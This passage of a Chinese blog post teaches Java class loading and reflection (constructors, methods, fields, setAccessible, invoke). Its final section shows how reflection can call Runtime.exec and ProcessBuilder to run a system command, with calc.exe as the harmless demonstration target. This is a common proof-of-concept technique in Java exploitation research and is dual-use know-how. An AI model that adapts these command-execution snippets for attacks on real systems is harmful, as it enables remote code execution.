<li><p>从JAR包中加载CLASS文件</p>
</li>
<li><p>通过网络加载CLASS文件</p>
</li>
<li><p>通过JAVA源文件动态编译加载执行</p>
<p>JVM自带的类加载器通常分为如下三种：</p>
</li>
</ul>
<p><strong>BootStrap ClassLoader</strong> ：启动类加载器，是顶层加载器。</p>
<p><strong>Extension ClassLoader</strong>：称之为扩展类加载器，负责加载Java的扩展类库，默认加载$JAVA_HOME中jre/lib/*.jar 或 -Djava.ext.dirs指定目录下的jar包。</p>
<p><strong>System ClassLoader</strong>：称之为系统类加载器，负责加载应用程序classpath目录下所有jar和class文件。</p>
<p>​    那么者三种类型的加载器之间的继承关系是怎样的？可以写个代码简单测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ClassLoader loader &#x3D; Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        System.out.println(loader.getParent());</span><br><span class="line">        System.out.println(loader.getParent().getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202163758388.png" alt="image-20201202163758388"></p>
<p>​        通过上面的结果，我们可以看出    APPClassLoader的父类型是ExtClassLoader，但是ExtClassLoader的父类型空，因为BootStrap ClassLoader是用C++写的。</p>
<h5 id="JVM的类加载机制"><a href="#JVM的类加载机制" class="headerlink" title="JVM的类加载机制"></a><strong>JVM的类加载机制</strong></h5><p>​        <strong>全盘负责</strong>，当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显示使用另外一个类加载器来载入</p>
<p>​        <strong>父类委托</strong>，先让父类加载器试图加载该类，只有在父类加载器无法加载该类时才尝试从自己的类路径中加载该类</p>
<p>​        <strong>缓存机制</strong>，缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存区寻找该Class，只有缓存区不存在，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存区。这就是为什么修改了Class后，必须重启JVM，程序的修改才会生效</p>
<h5 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h5><p>​        类的加载方式有三种：</p>
<ul>
<li><p>命令行启动JAVA程序时由JVM加载</p>
</li>
<li><p>通过Class.forName()方法加载</p>
</li>
<li><p>通过ClassLoader.loadClass()方法动态加载</p>
<p>我们可以写个demo测试一下这几种加载方式有何不不同。</p>
<p>首先测试loadClass方式，我们在loadClass处下断点，查看其具体的操作。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest&#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader loader &#x3D; test666.class.getClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        &#x2F;&#x2F;使用ClassLoader.loadClass()来加载类，不会执行初始化块</span><br><span class="line">        loader.loadClass(&quot;test666&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，默认会执行初始化块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，并指定ClassLoader，初始化时不执行静态块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;, false, loader);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在loadClass中，通过调用findLoadedClass来获取Class对象，再将Class对象返回，这个过程中并不会去调用获取到的Class类的static静态代码块的内容，也不会调用其对应的构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202170613299.png" alt="image-20201202170613299"></p>
<p>​        当我们通过获取的Class对象再调用newInstance方法时，则会先调用static静态代码块，再去调用构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171313057.png" alt="image-20201202171313057"></p>
<p>​        newInstance调用时，先调用静态代码块，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171335684.png" alt="image-20201202171335684"></p>
<p>​        再调用构造函数，如下图所示:</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171418171.png" alt="image-20201202171418171"></p>
<p>​        我们再测试一下Class.forName(“test666”)是如何工作的，由于forName内部的实现都是native层的，我这里跟踪不到，就不具体分析了，我们只了解一下它的执行结果。在<strong>调用forName后，会自动调用对应类的静态代码块，但不会执行构造方法。</strong>如果需要调用构造方法，则也需要调用newInstance方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202172214675.png" alt="image-20201202172214675"></p>
<p>​        我们之前的测试中加载的类是由无参数的构造方法的，如果没有无参数的构造方法，那么我们在调用newInstance的过程中，是否会去调用有参的构造方法。<strong>当我将加载类的构造方法的无参构造方法去掉时，调用newInstance将不会执行任何操作。</strong></p>
<p>​        关于类的加载先了解这么多，我们接下来主要了解下当获取到Class对象后如何通过反射调用来获取类的信息。</p>
<h4 id="反射调用获取类的信息"><a href="#反射调用获取类的信息" class="headerlink" title="反射调用获取类的信息"></a>反射调用获取类的信息</h4><p>​        通过之前的学习我们了解了如何获取Class对象，获取了这个对象后我们如何获取类的其他信息？我们接下来将一起学习这部分的内容。</p>
<h5 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h5><p>​        之前我们直接通过获取到的Class调用newInstance方法，只会调用访问权限为Public的无参构造器，如果我们想获取其他构造器该怎么办？JAVA为我们提供了下面几种获取构造器的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;T&gt; getConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的public构造器</span><br><span class="line">Constructor&lt;?&gt;[] getConstructors()  返回这个类的所有public类型的构造器</span><br><span class="line">Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的无视访问权限的构造器</span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructor()  获取Class对象的所有构造器无视访问权限的构造器</span><br></pre></td></tr></table></figure>

<p>​        我这里做了一个测试，我们尝试获取public访问权限的带参构造器,代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        成功访问到对应的带参构造器，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202180512409.png" alt="image-20201202180512409"></p>
<p>​        尝试访问priivate 权限的带参构造器，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getDeclaredConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        经过测试，也仅仅只能getDeclaredConstructor获取private类型的构造器，通过newInstance来调用private的构造方法还是会报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181052265.png" alt="image-20201202181052265"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181100882.png" alt="image-20201202181100882"></p>
<h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p>​        下面我们一起学习一下如何获取对应的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到该类所有的方法无视方法的访问权限</span><br><span class="line">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到指定类的public方法</span><br></pre></td></tr></table></figure>

<p>​        我们做一个测试,查看如何通过getMethod获取对应的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Method methods &#x3D;test666.getMethod(&quot;xxx&quot;,String.class);</span><br><span class="line">System.out.println(methods);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223349526.png" alt="image-20201202223349526"></p>
<p>​        上面是当我们反射调用的test666类存在xxx方法时调用的结果，如果test666类不存在我们要调用的xxx方法，而test666的父类test888存在我们要调用的方法，那么我们通过getMethod是否能获取test888对应的方法呢？</p>
<p>​        答案是<strong>当前通过反射调用getMethod的类如果没有我们想要调用的方法，则会通过反射调用父类对应的方法</strong>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223717517.png" alt="image-20201202223717517"></p>
<p>​    当我们将需要反射调用的方法改为private的访问权限，通过getDeclaredMethod仍然可以找到对应的方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202224039107.png" alt="image-20201202224039107"></p>
<h5 id="获取变量"><a href="#获取变量" class="headerlink" title="获取变量"></a>获取变量</h5><p>​        获取变量的信息可以通过下面的两个方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFiled：访问公有的成员变量</span><br><span class="line">getDeclaredField：所有已声明的成员变量，但不能得到其父类的成员变量</span><br></pre></td></tr></table></figure>

<p>​        为了方便大家理解，我们同样写一个DEMO进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getField(&quot;cmd&quot;);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p>​        在test666这个类中，有一个cmd参数，我们测试能否通过反射调用来获取cmd这个变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203092022639.png" alt="image-20201203092022639"></p>
<p>​        我们打开debug进行调试，可以看到当调用newInstance来创建test666这个类的实例时，会对变量进行初始化。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111226737.png" alt="image-20201203111226737"></p>
<p>​    通过getFiled获取到cmd变量，最后通过filed.get获取实例化对象o对应的变量cmd的内容进行输出。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111441672.png" alt="image-20201203111441672"></p>
<p>​        但是使用getFiled获取不到函数中定义的变量，即使是构造函数中的变量也无法获得，当我们尝试获取非public权限的变量，会获取失败，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112359310.png" alt="image-20201203112359310"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112439206.png" alt="image-20201203112439206"></p>
<p>​        我们将test666这个类中的变量cmd访问权限修改为private，setAccessible修改访问权限后，通过反射调用获取变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113340739.png" alt="image-20201203113340739"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113529161.png" alt="image-20201203113529161"></p>
<h5 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h5><p>​        获取到方法后，我们可以通过invoke来调用方法，并传递参数，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">  Object o&#x3D;test666.newInstance();</span><br><span class="line">  Method method &#x3D; test666.getMethod(&quot;test123&quot;, String.class);</span><br><span class="line">  Object result &#x3D; method.invoke(o,&quot;hello world&quot;);</span><br><span class="line">  System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        在test666类中的test123方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public String test123(String aaa)&#123;</span><br><span class="line">    String x&#x3D;aaa;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过invoke反射调用，执行test123方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203114541607.png" alt="image-20201203114541607"></p>
<p>​        如果是private的方法，我们也可以通过getDeclaredMethod来获取并进行调用，不过在调用之前需要调用setAccessible方法设置属性。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203120405405.png" alt="image-20201203120405405"></p>
<h5 id="修改私有变量"><a href="#修改私有变量" class="headerlink" title="修改私有变量"></a>修改私有变量</h5><p>​        我们之前了解了一些获取变量的方法，那么这些变量我们该如何进行修改呢？下面是我的测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">      Object o&#x3D;test666.newInstance();</span><br><span class="line">      Field privateField &#x3D; test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">      privateField.setAccessible(true);</span><br><span class="line">      privateField.set(o, &quot;hello&quot;);</span><br><span class="line">      System.out.println(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>​        test666类中cmd的值是xxx</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132448457.png" alt="image-20201203132448457"></p>
<p>​        运行程序后，cmd变量的值成功被修改。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132532134.png" alt="image-20201203132532134"></p>
<h4 id="反射调用执行系统命令"><a href="#反射调用执行系统命令" class="headerlink" title="反射调用执行系统命令"></a>反射调用执行系统命令</h4><p>​        我们平时遇到的JAVA命令执行，大多数是通过反射调用Process.builder执行系统命令而很少使用Runtime.exec来执行命令，这是为什么？能否通过Runtime.exec来执行命令呢？</p>
<h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>​        首先测试一下Runtime能否通过反射调用exec方法来进行命令执行，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor con&#x3D;clazz.getDeclaredConstructor();</span><br><span class="line">Object o&#x3D; con.newInstance();</span><br><span class="line">Method methods &#x3D;clazz.getDeclaredMethod(&quot;exec&quot;,String.class);</span><br><span class="line">methods.invoke(o,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>​        我在测试过程中发现，当执行到newInstance会报错</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142145567.png" alt="image-20201203142145567"></p>
<p>​        我们查看runtime的源码，可以看到Runtime只有一个private类型的构造函数，因此直接调用这个构造函数会因为访问权限不足而报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142209061.png" alt="image-20201203142209061"></p>
<p>​        但是结合我们之前讲过的方法，我们可以使用setAccessible来设置访问权限,我尝试修改这个构造方法的访问权限，最终可以通过反射来调用Runtime.exec来执行命令。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142503837.png" alt="image-20201203142503837"></p>
<h5 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h5><p>​        我们再试试通过ProcessBuilder来执行系统命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">Constructor con &#x3D; test666.getConstructor(List.class);</span><br><span class="line">Object o&#x3D;con.newInstance(Arrays.asList(&quot;calc.exe&quot;));</span><br><span class="line">Method method &#x3D; test666.getMethod(&quot;start&quot;);</span><br><span class="line">Object result &#x3D; method.invoke(o);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        这里需要注意，由于ProcessBuilder没有无参构造器，所以在调用构造方法的时候需要传递需要的参数类型，创建实例的时候也需要传入参数，但是调用start方法的时候无需传入参数，由于ProcessBuilder的构造方法是public类型，因此无需设置访问权限。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203144932128.png" alt="image-20201203144932128"></p>
<p>​        当然ProcessBuilder的构造方法不止这一个，还有一个重载的方法</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203145832898.png" alt="image-20201203145832898"></p>
<p>​        下面我们学习一下如何通过反射调用这个方法，这里面使用了的参数是变长参数，对于边长参数，我们也可以当数组来处理，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152347974.png" alt="image-20201203152347974"></p>
<p>​        所以我们获取这个构造方法时可以这样<code>getConstructor(String[].class)</code> </p>
<p>当我们通过<code>newInstance</code>来创建实例时，由于newInstance这个函数也是可变参数，所以可以使用两层数组来引用<code>new String[][]calc.exe</code>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152629453.png" alt="image-20201203152629453"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152723799.png" alt="image-20201203152723799"></p>
<p>​        由于newInstance接收的可变参数是Object类型，因此可以通过<code>(Object)new String[]{&quot;calc.exe&quot;}</code>来创建实例。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203153631825.png" alt="image-20201203153631825"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">38</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
